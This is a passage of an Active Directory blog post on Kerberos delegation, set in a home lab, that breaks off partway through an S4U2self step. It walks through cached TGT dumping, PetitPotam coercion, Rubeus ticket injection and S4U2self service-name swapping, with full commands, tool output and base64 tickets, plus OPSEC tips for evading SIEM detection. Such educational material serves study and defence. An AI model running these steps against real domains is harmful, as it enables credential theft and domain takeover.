---
title: "Do You Really Understand Kerberos Delegation?"
date: 2026-03-27
permalink: /Active-Directory/Delegation/
categories: [Active Directory]
tags: [Active Directory, Delegation]
math: true
mermaid: true
image:
  path: /assets/img/Delegation/delegation.jpg
---



Hello fellow packet enjoyers and delegation survivors,

Today we’re (deep) diving into one of those Active Directory “features” that sounds simple on paper but quickly turns into a full-blown existential crisis once you actually try to understand it.

You’ve probably seen the buzzwords thrown around like
S4U2Self, S4U2Proxy, RBCD, forwardable tickets…
and at some point you just nod and pretend it makes sense.
![image](/assets/img/Delegation/brainfuck.png)
_image from @theluemmel_


**well… it doesn’t**



So in this post, we’re going to tear this thing apart properly.
Not just “what it does”, but what the KDC is actually doing,  how tickets are being forged, modified, and forwarded, and most importantly… what this looks like on the wire


This post is mainly for two reasons:

1. Beacuse why not
2. To help me understand what the hell is going on (still not fully clicking even after writing this)


If you’ve ever:
- blindly run `Rubeus s4u` and hoped for the best
- been confused why you need a forwardable ticket
- or didn’t understand why delegation sometimes works and sometimes doesn’t

this post is for you.

--- 

## Content

We’ll walk through:

- Unconstrained Delegation
- Constrained Delegation (with and without protocol transition)
- Resource-Based Constrained Delegation



### Fair Warning
Before we go any further, go grab a cup of coffee… or two.

This is not one of those 5 minute read posts where you skim a few diagrams and call it a day.
We’re going deep into the weeds here.. packets, ticket flags, KDC logic, weird edge cases, and the kind of stuff that makes you question your life choices at 3AM.

Now let’s break it.

---
## Lab Setup

I have set up a lab that looks something like this:

| Machine | IP          | Configuration                                                   |
| :------ | :---------- | :---------------------------------------------------------------|
| DC01    | 10.0.0.2    | Main DC (`lol.local`)                                           |
| SRV02   | 10.0.0.3    | Hosts IIS and is Allowed to Delegate to `DC01` (Constrained)    |
| WS01    | 10.0.0.4    | `TRUSTED_FOR_DELEGATION` (Unconstrained)                        |
| Kali    | 10.0.0.129  | Hosting AdaptixC2                                               | 



SRV02 is a Windows Server hosting IIS, configured with Kerberos Constrained Delegation. It runs a simple ASP page that connects to a share on DC01 (`\\DC01\ShareSupport`) on behalf of the authenticated user. 
> The machine runs IIS under a dedicated service account `svc_iis`, which owns the SPN `HTTP/srv02.lol.local` and is trusted to delegate to `cifs/DC01` (to list the content of `ShareSupport`)

we can also see that from access token of `w3wp.exe` (IIS worker process) that it can act as any user that authenticates to it.

![image](/assets/img/Delegation/priv.png)

> NOTE: Most of the commands we’ll be using require `SYSTEM` level privileges on the machine to extract tickets. + I will be using [Kerbeus-BOF](https://github.com/RalfHacker/Kerbeus-BOF) instead of Rubeus
{: .prompt-warning }
---

## What Is Delegation?
Kerberos delegation lets a service act as a user when interacting with other services. Imagine you log into some front-end web app, but behind the scenes it needs to talk to a database or a file server to actually get things done. At that point, the app needs a way to access those backend resources as you, not as itself.

![diagram](/assets/img/Delegation/diagram.svg) 


We know when a user logs in during the initial logon, he obtain a TGT which he can use to grab service tickets for whatever they need (enabling SSO). But in a scenario like this how does the web server get a SQL service ticket as that user?
that’s the problem delegation was built to solve.

<!-- When user logs in he obtain a TGT which is used to requset TGS for various services, which implements the sense of SSO. But in a scenario like this how could the web server obtain a SQL service ticket for the user? this what delegation was made for -->

## SeEnableDelegationPrivilege
This privilege is the heart of delegation configuration and it is granted by default for doamin admins and enterprise admins.. but if it is configured for a user (or computer) account + having any way of edititng Object attributes like `GenericWrite` or `WriteProperty` etc.. They can enable (or edit):
- `msDS-AllowedToDelegateTo`
- `TrustedForDelegation`
- `TrustedToAuthForDelegation`

*We will talk more about each one of them in it's own section*

And since it is configured using a GPO, we can't really see it in bloodhound. so to enumerate something like this we can use tools like `powerview` or by viewing the GPO's configurations since it is inside `SYSVOL` (and any domain user can access it), for me it was in `SYSVOL\lol.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf` (`{31B2F340-016D-11D2-945F-00C04FB984F9}` is the default GUID for the `Default Domain Controllers Policy` that is where I configured it)
![image](/assets/img/Delegation/18.png)
_This SID resolves to user pixel_

---

## Unconstrained Delegation
I won’t go too deep into this part with traffic analysis since [@0x4148](https://x.com/0x4148) already did a great job covering this in far more detail in his blog[^blog].


But in general Unconstrained Delegation is a configuration where any account (usually a machine account) is trusted to store TGT of any user who auth to that machine and can be used to request a TGS to any service in the entire domain. this means that we can impersonate **any** user to access **any** service.


So if we have control over a machine with `TRUSTED_FOR_DELEGATION` and a high-privileged user authenticates to it, we can then extract their TGT and use it to request service tickets to any other service.

### Enumeration
we can use ldap query to filter only computer accounts with [SAM-Account-Type attribute](https://learn.microsoft.com/en-us/windows/win32/adschema/a-samaccounttype) of `0x30000001` which resolves in decimal to `805306369` (`SAM_MACHINE_ACCOUNT`) and using bitwise AND with trusted for delegation flag `524288`, all other flags can be found [here](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties) 
```shell
beacon> ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname

--------------------
sAMAccountName: DC01$
--------------------
sAMAccountName: WS01$
retrieved 2 results total

```
As configured we can see that `WS01$` is configured with `TRUSTED_FOR_DELEGATION`

> Domain Controllers are configured with unconstrained delegation by default, but that’s not particularly useful. If you’ve compromised the DC, it's already game over.
{: .prompt-info }

### Abusing Unconstrained Delegation #1
If a high level user authenticate to `WS01` and we used a tool like [Kerbeus-BOF](https://github.com/RalfHacker/Kerbeus-BOF) to see what tickets are cached we can see user `administrator` has authenticated to the `WS01` and `WS01` cached it's TGT (we can tell it is TGT because the service is `KRBTGT`) 

```shell
beacon> krb_triage
[+] Kerbeus TRIAGE by RalfHacker
[+] host called home, sent: 13289 bytes
[+] received output:

Action: List Kerberos Tickets (All Users)


--------------------------------------------------------------------------------------------------------------------------
| LUID        | Client                                   | Service                                  |            End Time |
--------------------------------------------------------------------------------------------------------------------------
| 0:0x24ab54  | Administrator @ LOL.LOCAL                | krbtgt/LOL.LOCAL                         | 28.03.2026 04:54:43 |
| 0:0x1759f4  | Administrator @ LOL.LOCAL                | krbtgt/LOL.LOCAL                         | 28.03.2026 04:05:11 |
| 0:0x953ff   | pixel @ LOL.LOCAL                        | krbtgt/LOL.LOCAL                         | 28.03.2026 04:16:42 |
| 0:0x953ff   | pixel @ LOL.LOCAL                        | krbtgt/LOL.LOCAL                         | 28.03.2026 04:16:42 |
| 0:0x953ff   | pixel @ LOL.LOCAL                        | LDAP/DC01.lol.local/lol.local            | 28.03.2026 04:16:42 |
| 0:0x953ff   | pixel @ LOL.LOCAL                        | cifs/DC01                                | 28.03.2026 04:16:42 |
| 0:0x953db   | pixel @ LOL.LOCAL                        | krbtgt/LOL.LOCAL                         | 28.03.2026 04:16:42 |
| 0:0x953db   | pixel @ LOL.LOCAL                        | LDAP/DC01.lol.local/lol.local            | 28.03.2026 04:16:42 |
| 0:0x3e4     | ws01$ @ LOL.LOCAL                        | krbtgt/LOL.LOCAL                         | 28.03.2026 04:16:03 |
| 0:0x3e7     | ws01$ @ LOL.LOCAL                        | LDAP/DC01.lol.local/lol.local            | 28.03.2026 04:16:03 |
--------------------------------------------------------------------------------------------------------------------------
```


Now we can dump the ticket:
```shell
beacon> krb_dump /luid:24ab54
[+] Kerbeus DUMP by RalfHacker
[+] host called home, sent: 16794 bytes
[+] received output:

Action: List Kerberos Tickets( LUID: 24ab54)

[*] Target LUID     : 24ab54

UserName                : Administrator
Domain                  : LOL
LogonId                 : 0:0x24ab54
Session                 : 0
UserSID                 : S-1-5-21-1558345677-4257867870-1842270656-500
Authentication package  : Kerberos
LogonServer             : 
UserPrincipalName       : 

[*] Cached tickets: (1)

  [0]
	ClientName               :  Administrator @ LOL.LOCAL
	ServiceRealm             :  krbtgt/LOL.LOCAL @ LOL.LOCAL
	StartTime (UTC)          :  27.03.2026 18:54:43
	EndTime (UTC)            :  28.03.2026 04:54:43
	RenewTill (UTC)          :  03.04.2026 18:54:43
	Flags                    :  forwardable forwarded renewable pre_authent enc_pa_rep 
	KeyType                  :  aes256_cts_hmac_sha1

	doIFMjCCBS6gAwIBBaEDAgEWooIEOzCCBDdhggQzMIIEL6ADAgEFoQsbCUxPTC5MT0NBTKIeMBygAwIBAqEVMBMbBmtyYnRndBsJTE9MLkxPQ0FMo4ID+TCCA/WgAwIBEqEDAgECooID5wSCA+P+0oTz/pdfSRSTlvEM0rZBBwJjTfk5Gyzp1kIK780fa3mU5FL8aiUnX7wuYj96OyoI86jHD+QoTYijKv87OoP6oVyzO3Mn/1OQTSD+XJ4W8FQ8iiiqaAHxWJozDnD1Hi7I+QTESvfyuaqQ/DRKSHppJy5ED38PxPD1L4V5kQFoRc3vG6Ue8KepspmHpWkOF5HWq5VjbUGJmQksQAKRComH5EmHiyZ7vNQtxkABjWNI4LT2UTUrfF2fimPt0bxyigk0nfcZMeo05eQnmSkj4mXRStGcGYWGzxI47VkomnSti9m/uOngUvGFG7iBKXbzCl/8p9PzRIBNLlSwsyJ1yONJuRzlvexdm7IXojMr5dlAJsJMLDad2USGaGdD/GkC5XpFnnSJfgGUsrQeyUwgx+yqfCkn8Qw+97W2S9UXXCDYt+9EKum8hNUHHE/njLaGOrncv6ioF5tjaRiSoKvR0XaTeBfMPbO+XNnBsbFwONPs8c+1S46zu5bLVvu6c2qUtN8YlOYjlnSDXuZQJ2fzcgQzooyBa6+yO6q9FKY5BYL301CfBJsxohnpfZWeVXaRbcY8rDNDEIG6JWZ/EqNqcTypMzOfAu+PunzeRabgnVc0DPg5ppCcqY9RRbxQzdFK1W9lGFIqMl17V55wyjGtoEj0bz5gDh1nk771l6EmbdisNnIC4S5P88fEgV78JyjsMdLLfJfBJlllRYM4IksteYxJTlcJGYOOr4kPGOGXbIzfsJvm+j0HK+8XhanD2MDBXaHJV/ZHtVgUw6xkgH2uENaHFbEmnxz+Ga/WnHzImPSelRPk0bWdp/E/J0upPZP0mvw+3NzATneDrwi7uVHrEKRSXLQoqFT/EltpTaJ8Vhcx3U79Q0UbAHXOhuHWEiwbz/liX+MVHIO70lJVWh8iU3pRQWBoQHD2m+RggPVP27tPzg4WBN19EZNePAJgBXL43YfNUsLgmgMbj72ptwvaemf23+DuIIqzsiQQmeWwl6QE2X9UAR1wHDLCfukC7eEEt4wLpthCSbnfynpOXia3hlADYTXq0dPw5uz6WyPWyD73n51Me+OXm3JmJ7Ify/6pgSArdL7Pz2pFYDRYpheW68WeJNaEZ1QTsc4XqIGLW2Rd72n3AFlOSdwoxZ7/wcF/RIXw7muO5bjWCX5Y1Cto73A/2ez3AGyj9BT92OpVY05Fv0iYPR6Ya5XEyKdDArrI6c8ZOZIdQ8Yf0kV5SOEGoZ65pVm7cT6PKfNl2OMouN/0CjaoVZE17dqxSluKqgpnuu0XXXoju3VqekNiv5GB8/uG2ikkqDG+15ZspAoqmZ91KamMlaOB4jCB36ADAgEAooHXBIHUfYHRMIHOoIHLMIHIMIHFoCswKaADAgESoSIEICFUey9/gH7rWSdtG939JsKtp4GCLlm4BZSQAjgeq77doQsbCUxPTC5MT0NBTKIaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3KjBwMFAGChAAClERgPMjAyNjAzMjcxODU0NDNaphEYDzIwMjYwMzI4MDQ1NDQzWqcRGA8yMDI2MDQwMzE4NTQ0M1qoCxsJTE9MLkxPQ0FMqR4wHKADAgECoRUwExsGa3JidGd0GwlMT0wuTE9DQUw=
```
We can see that it has `forwardable` flag enabled and that is exactly what we need in order to use it to request TGS to other services.


> If a user was in the `Protected Users` (or is marked as "Sensitive and cannont b e delegated") their TGT won't even get cached on the machine at all. more info on this group here[^protected]
{: .prompt-danger }

There are Numours ways to use this ticket one way is with Rubeus `createnetonly`, which uses the `CreateProcessWithLogonW()` API to spawn a new hidden process with logon type 9 (NewCredentials). Then we can then inject the ticket into that session and use it for network authentication.


### Abusing Unconstrained Delegation #2 From Forced Authentication to Computer Takeover


> *Before diving into anything, it is important to note that while we are using an Unconstrained Delegation mcahine to capture the ticket, the actual 'Computer Takeover' trick (S4U2self) does not require the target machine to have any delegation configured. Any computer account in the domain can use the S4U2self extension to request a TGS for any user to itself without prior setup.*

Waiting for a high level user to authenticate to them machine that we own isn't the most reliable way in real life scenarios, we are not guaranteed to have a high level user auth to us. 



So instead of there is a way to get local admin on any machine by forging TGS for any user to that specific computer by:
1. Forcing the targeted computer (`DC01`) to auth to us (via tools like `PetitPotam` or `SpoolSample`).

2. Because of the delegation setting, `DC01` sends its own Machine Account TGT (DC01$) to our server. This ticket is now cached in `LSASS` of `SRV02`.

3. We use this captured DC01$ TGT to perform an S4U2self request *(More details on this below)*. This asks the Domain Controller to give us a TGS for any user (like Administrator) to a service on that same machine.
- *This works even if the user is marked as "Sensitive and cannot be delegated" because the computer is only delegating to itself, which bypasses that specific Kerberos restriction.*
4. PtT using the new TGS. and since the service (like `cifs`) runs as `SYSTEM`, it can decrypt the ticket we just forged with the `DC01$` machine key.

> You might be thinking why doing all this if we can have the DC's TGT we can just `DCSync` and own everything, well you are right but this applies to any computer account plus it is more OPSEC safe By using the DC's own identity to request a ticket for the Administrator, the resulting Kerberos traffic looks like standard protocol transition. Furthermore, using this ticket for administrative tasks is much stealthier than a `DCSync`, which generates massive replication traffic that modern SIEMs are specifically tuned to detect. If we need local admin to a certain computer (SQL server for example) this is a good technique to do it. 
{: .prompt-info }


Let's put all of this in action.

#### 1. Forcing authentication
we can use a tool like `PetitPotam` to force `DC01` to auth to our *— configured for unconstrained delegation machine —* `SRV02`
```bash
$ python3 PetitPotam.py  -d lol.local ws01.lol.local dc01.lol.local
                                                                         
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



Trying pipe lsarpc
[-] Connecting to ncacn_np:dc01.lol.local[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!

```

#### 2. Dumping DC01$ TGT from LSASS
we can monitor for new TGTs or use `krb_triage`, let's use Rubeus this time:
```shell
C:\>.\Rubeus.exe monitor /interval:5 /nowrap /filteruser:DC01$

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3

[*] Action: TGT Monitoring
[*] Target user     : DC01$
[*] Monitoring every 5 seconds for new TGTs


[*] 3/30/2026 4:05:46 PM UTC - Found new TGT:

  User                  :  DC01$@LOL.LOCAL
  StartTime             :  3/30/2026 5:41:55 PM
  EndTime               :  3/31/2026 3:41:14 AM
  RenewTill             :  4/6/2026 5:41:14 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIE8jCCBO6gAwIBBaEDAgEWooIEAzCCA/9hggP7MIID96ADAgEFoQsbCUxPTC5MT0NBTKIeMBygAwIBAqEVMBMbBmtyYnRndBsJTE9MLkxPQ0FMo4IDwTCCA72gAwIBEqEDAgECooIDrwSCA6vnyZxfyx4kZjMiUqIPE1WVRG11Qy5rLlvxncbSlWXGOIG+2IinCxjoIMZWDLrjlAlG8560bADLUoovkysecNUS7ufpYub9BMdLhYv7yLh/nUbp6x3lh7swHA7m9ET1ub5WMgsE+3Ovc89xPOKBYWByyX2zont0pdfdpuG8SGelgm6iELncH3Ek7uCkR/IYBtNZ14KgT+4nUCACj6x1pQ6Y1ZsM1vGHR+9Mmbjl1iemyImhTUfcjCSPGHL18CUkWEh1osOAVrppVqLq54nqXhDu/FKp1/I8H08l+R3kTGbsIgLFhkoq1qJXW6cxY/6KLP07pIUyuZY1hacDqLurnjR56rGNMyD2/xGlzpzwNlM0XEY4n6Y05UNYI+H9At09aMptYovzrwQ8h1S9d7LzzhpyDx0AqWkLwyl4Ug0xjI7vyUbm5mu2DLfN2OBOH+FwtC71eCfZCz1Zurk94nwSCAligM3K5DTEBHSwDSoVSh15fDMZlRX2da6a1iYGGze5uNvf8f6b79tbIJgab+UnX6qBKLvpkQXId6qPPu7qOybNiUktp+h/syAp4+myla3IxltMdyEP5M2fDhx7Vg6m2XsGto83W/nNWUbTbJb92uIPeuAdoxX95hgpTlH9Ma8jlMKyTjAWJGqJM3+UOo8ZOSN5kKZRxUoVpFyfUZHpNFGRKn1/KBReedV8nwBRLc1L0n8lqvbBbz6ZcYzqX0D8I69zwVXQ2dkGnbnQFfRjsAGn/GrbbgUcxVrcjpcnGvzcHAXRepxcYfeP4qhXp7yYFTvb348Q2UL7G8fOmtV0i7GLzOooDEXDOoOes2UovIUTRX4Bg/ljEmwO/Zh4Q9BXGEAaqhhq2t7SwAwVPl8dyeja2WP03jr1YgsSLg871S0mvOGvuo8morlTqKtpuzeHy8x6nYJuGIURNM64MNDaz7O6Yez5sNuE7fnDXZAZRZVCMJTa4U0Vwp4FDe0f5Xo/xaAhtxjY1IzlU9hhhx9XuxnBkeyOSUkFi8/CwixaLIXp4I18iYnU9LyTplDbf0efoVaY8QtMf6zvB7gZiBjow1QcBgTEC8yUqI0lqbChl+DPK/gEDFfE4IMPdEUM4FQJ21L/hXJOjyUpdQCwBpQJQSphjf3oFikw5ptLzzJTVpggcAplQXQ+zR/1PbVyRH5q/fVqf/aQ2CQxgAbr27PctyOjh8XAeo0wEOPifZeFo9gfLhGwWpR1JUo+EpYddw0qrqDy6KTkLzrtmrCF/gejgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaArMCmgAwIBEqEiBCAUfonuYfpWPX/pNptiAE0BHuGPxJsx6OMJa/itc9g41aELGwlMT0wuTE9DQUyiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI2MDMzMDE0NDE1NVqmERgPMjAyNjAzMzEwMDQxMTRapxEYDzIwMjYwNDA2MTQ0MTE0WqgLGwlMT0wuTE9DQUypHjAcoAMCAQKhFTATGwZrcmJ0Z3QbCUxPTC5MT0NBTA==

[*] Ticket cache size: 1
```

If we inject this ticket to our logon session and tried to list the `\\dc01\c$`, it won't work 
```shell
C:\>.\Rubeus.exe ptt /ticket:doIE8jCCBO6gAwIBBaEDAgEWooIEAzCCA/9hggP7MIID96ADAgEFoQsbCUxPTC5MT0NBTKIeMBygAwIBAqEVMBMbBmtyYnRndBsJTE9MLkxPQ0FMo4IDwTCCA72gAwIBEqEDAgECooIDrwSCA6vnyZxfyx4kZjMiUqIPE1WVRG11Qy5rLlvxncbSlWXGOIG+2IinCxjoIMZWDLrjlAlG8560bADLUoovkysecNUS7ufpYub9BMdLhYv7yLh/nUbp6x3lh7swHA7m9ET1ub5WMgsE+3Ovc89xPOKBYWByyX2zont0pdfdpuG8SGelgm6iELncH3Ek7uCkR/IYBtNZ14KgT+4nUCACj6x1pQ6Y1ZsM1vGHR+9Mmbjl1iemyImhTUfcjCSPGHL18CUkWEh1osOAVrppVqLq54nqXhDu/FKp1/I8H08l+R3kTGbsIgLFhkoq1qJXW6cxY/6KLP07pIUyuZY1hacDqLurnjR56rGNMyD2/xGlzpzwNlM0XEY4n6Y05UNYI+H9At09aMptYovzrwQ8h1S9d7LzzhpyDx0AqWkLwyl4Ug0xjI7vyUbm5mu2DLfN2OBOH+FwtC71eCfZCz1Zurk94nwSCAligM3K5DTEBHSwDSoVSh15fDMZlRX2da6a1iYGGze5uNvf8f6b79tbIJgab+UnX6qBKLvpkQXId6qPPu7qOybNiUktp+h/syAp4+myla3IxltMdyEP5M2fDhx7Vg6m2XsGto83W/nNWUbTbJb92uIPeuAdoxX95hgpTlH9Ma8jlMKyTjAWJGqJM3+UOo8ZOSN5kKZRxUoVpFyfUZHpNFGRKn1/KBReedV8nwBRLc1L0n8lqvbBbz6ZcYzqX0D8I69zwVXQ2dkGnbnQFfRjsAGn/GrbbgUcxVrcjpcnGvzcHAXRepxcYfeP4qhXp7yYFTvb348Q2UL7G8fOmtV0i7GLzOooDEXDOoOes2UovIUTRX4Bg/ljEmwO/Zh4Q9BXGEAaqhhq2t7SwAwVPl8dyeja2WP03jr1YgsSLg871S0mvOGvuo8morlTqKtpuzeHy8x6nYJuGIURNM64MNDaz7O6Yez5sNuE7fnDXZAZRZVCMJTa4U0Vwp4FDe0f5Xo/xaAhtxjY1IzlU9hhhx9XuxnBkeyOSUkFi8/CwixaLIXp4I18iYnU9LyTplDbf0efoVaY8QtMf6zvB7gZiBjow1QcBgTEC8yUqI0lqbChl+DPK/gEDFfE4IMPdEUM4FQJ21L/hXJOjyUpdQCwBpQJQSphjf3oFikw5ptLzzJTVpggcAplQXQ+zR/1PbVyRH5q/fVqf/aQ2CQxgAbr27PctyOjh8XAeo0wEOPifZeFo9gfLhGwWpR1JUo+EpYddw0qrqDy6KTkLzrtmrCF/gejgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaArMCmgAwIBEqEiBCAUfonuYfpWPX/pNptiAE0BHuGPxJsx6OMJa/itc9g41aELGwlMT0wuTE9DQUyiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI2MDMzMDE0NDE1NVqmERgPMjAyNjAzMzEwMDQxMTRapxEYDzIwMjYwNDA2MTQ0MTE0WqgLGwlMT0wuTE9DQUypHjAcoAMCAQKhFTATGwZrcmJ0Z3QbCUxPTC5MT0NBTA==

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3


[*] Action: Import Ticket
[+] Ticket successfully imported!

C:\>klist

Current LogonId is 0:0x926f3

Cached Tickets: (1)

#0>     Client: DC01$ @ LOL.LOCAL
        Server: krbtgt/LOL.LOCAL @ LOL.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 3/30/2026 17:41:55 (local)
        End Time:   3/31/2026 3:41:14 (local)
        Renew Time: 4/6/2026 17:41:14 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

C:\>dir \\dc01\c$
Access is denied.
```
This is because by default, a computer's machine account is not a member of its own local Administrators group for **network logons**. Therefore, even with the computer's TGT, we lack the administrative privileges. 

If we run `klist` to list our tickets we will see that even though `DC01$` TGT was used to get a **VALID** `cifs` TGS we cannot list `c$`
```shell
C:\>klist

Current LogonId is 0:0x926f3

Cached Tickets: (3)

#0>     Client: DC01$ @ LOL.LOCAL
        Server: krbtgt/LOL.LOCAL @ LOL.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 3/30/2026 20:35:44 (local)
        End Time:   3/31/2026 3:41:14 (local)
        Renew Time: 4/6/2026 17:41:14 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x2 -> DELEGATION
        Kdc Called: DC01.lol.local

#1>     Client: DC01$ @ LOL.LOCAL
        Server: krbtgt/LOL.LOCAL @ LOL.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 3/30/2026 17:41:55 (local)
        End Time:   3/31/2026 3:41:14 (local)
        Renew Time: 4/6/2026 17:41:14 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
        
#2>     Client: DC01$ @ LOL.LOCAL
        Server: cifs/dc01 @ LOL.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a50000 -> forwardable forwarded renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 3/30/2026 20:35:44 (local)
        End Time:   3/31/2026 3:41:14 (local)
        Renew Time: 4/6/2026 17:41:14 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: DC01.lol.local
```
This is a clean proof of the difference between **authentication and authorization**, we successfully authenticated, but authorization still shuts us down.

This why we need the next step..

#### 3. Request a S4U2Self
The S4U2self request is a Kerberos extension that allows a service to ask the KDC for a TGS for any user to itself without any prior configuration.

This was first pointed out by [elad shamir](https://twitter.com/elad_shamir) and was added to `Rubeus` later on. 

What the tool does is a very normal S4U2Self that hands back a TGS (forwardable) that will be valid for a S4U2Proxy on behalf of the user(which we can't because there is no Constrained Delegation), but what `Rubeus` will do is *swaps* an unencrypted header (SPN) of that ticket with whatever in `/altservice` option. This works because all services on on a domain controller run under the exact same machine account `DC01$`, so they all share the exact same encryption key.

```shell

beacon> krb_s4u /impersonateuser:Administrator /self /altservice:cifs/dc01 /ticket:doIE8jCCBO6gAwIBBaEDAgEWooIEAzCCA/9hggP7MIID96ADAgEFoQsbCUxPTC5MT0NBTKIeMBygAwIBAqEVMBMbBmtyYnRndBsJTE9MLkxPQ0FMo4IDwTCCA72gAwIBEqEDAgECooIDrwSCA6vnyZxfyx4kZjMiUqIPE1WVRG11Qy5rLlvxncbSlWXGOIG+2IinCxjoIMZWDLrjlAlG8560bADLUoovkysecNUS7ufpYub9BMdLhYv7yLh/nUbp6x3lh7swHA7m9ET1ub5WMgsE+3Ovc89xPOKBYWByyX2zont0pdfdpuG8SGelgm6iELncH3Ek7uCkR/IYBtNZ14KgT+4nUCACj6x1pQ6Y1ZsM1vGHR+9Mmbjl1iemyImhTUfcjCSPGHL18CUkWEh1osOAVrppVqLq54nqXhDu/FKp1/I8H08l+R3kTGbsIgLFhkoq1qJXW6cxY/6KLP07pIUyuZY1hacDqLurnjR56rGNMyD2/xGlzpzwNlM0XEY4n6Y05UNYI+H9At09aMptYovzrwQ8h1S9d7LzzhpyDx0AqWkLwyl4Ug0xjI7vyUbm5mu2DLfN2OBOH+FwtC71eCfZCz1Zurk94nwSCAligM3K5DTEBHSwDSoVSh15fDMZlRX2da6a1iYGGze5uNvf8f6b79tbIJgab+UnX6qBKLvpkQXId6qPPu7qOybNiUktp+h/syAp4+myla3IxltMdyEP5M2fDhx7Vg6m2XsGto83W/nNWUbTbJb92uIPeuAdoxX95hgpTlH9Ma8jlMKyTjAWJGqJM3+UOo8ZOSN5kKZRxUoVpFyfUZHpNFGRKn1/KBReedV8nwBRLc1L0n8lqvbBbz6ZcYzqX0D8I69zwVXQ2dkGnbnQFfRjsAGn/GrbbgUcxVrcjpcnGvzcHAXRepxcYfeP4qhXp7yYFTvb348Q2UL7G8fOmtV0i7GLzOooDEXDOoOes2UovIUTRX4Bg/ljEmwO/Zh4Q9BXGEAaqhhq2t7SwAwVPl8dyeja2WP03jr1YgsSLg871S0mvOGvuo8morlTqKtpuzeHy8x6nYJuGIURNM64MNDaz7O6Yez5sNuE7fnDXZAZRZVCMJTa4U0Vwp4FDe0f5Xo/xaAhtxjY1IzlU9hhhx9XuxnBkeyOSUkFi8/CwixaLIXp4I18iYnU9LyTplDbf0efoVaY8QtMf6zvB7gZiBjow1QcBgTEC8yUqI0lqbChl+DPK/gEDFfE4IMPdEUM4FQJ21L/hXJOjyUpdQCwBpQJQSphjf3oFikw5ptLzzJTVpggcAplQXQ+zR/1PbVyRH5q/fVqf/aQ2CQxgAbr27PctyOjh8XAeo0wEOPifZeFo9gfLhGwWpR1JUo+EpYddw0qrqDy6KTkLzrtmrCF/gejgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaArMCmgAwIBEqEiBCAUfonuYfpWPX/pNptiAE0BHuGPxJsx6OMJa/itc9g41aELGwlMT0wuTE9DQUyiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI2MDMzMDE0NDE1NVqmERgPMjAyNjAzMzEwMDQxMTRapxEYDzIwMjYwNDA2MTQ0MTE0WqgLGwlMT0wuTE9DQUypHjAcoAMCAQKhFTATGwZrcmJ0Z3QbCUxPTC5MT0NBTA==
[+] Kerbeus S4U by RalfHacker
[+] host called home, sent: 69113 bytes
[+] received output:
[*] Action: S4U

[*] Building S4U2self request for: 'DC01$@LOL.LOCAL'
[+] S4U2self success!
[*] Substituting alternative service name 'cifs/dc01'
[*] Got a TGS for 'Administrator' to 'cifs@LOL.LOCAL'
[*] base64(ticket.kirbi):

